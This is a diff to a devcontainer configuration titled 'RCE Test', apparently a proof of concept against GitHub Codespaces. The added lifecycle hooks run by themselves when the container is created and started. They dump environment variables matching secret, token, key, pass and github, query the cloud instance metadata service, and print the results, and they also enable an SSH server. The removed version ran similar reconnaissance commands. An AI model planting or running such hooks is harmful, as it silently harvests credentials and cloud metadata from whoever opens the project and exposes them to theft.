@@ -1,7 +1,9 @@
 {
     "name": "RCE Test",
     "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
-    "postCreateCommand": "curl -s https://api.github.com/zen && whoami && id && hostname && uname -a && env | grep -i github | head -20",
-    "postStartCommand": "echo RCE_PROOF_$(whoami)_$(hostname) > /tmp/rce_proof.txt && cat /tmp/rce_proof.txt",
-    "postAttachCommand": "echo ATTACHED_$(date +%s)"
+    "features": {
+        "ghcr.io/devcontainers/features/sshd:1": { "version": "latest" }
+    },
+    "postCreateCommand": "echo '=== CODESPACE RCE ===' && whoami && id && hostname && uname -a && env | sort > /tmp/full_env.txt && env | grep -iE '(secret|token|key|pass|github|codespace)' > /tmp/secrets.txt && cat /tmp/secrets.txt && curl -sm5 http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H 'Metadata:true' > /tmp/imds.json 2>/dev/null && cat /tmp/imds.json | head -c 500 && echo '=== DONE ==='",
+    "postStartCommand": "cat /tmp/secrets.txt 2>/dev/null && cat /tmp/imds.json 2>/dev/null | head -c 200"
 }
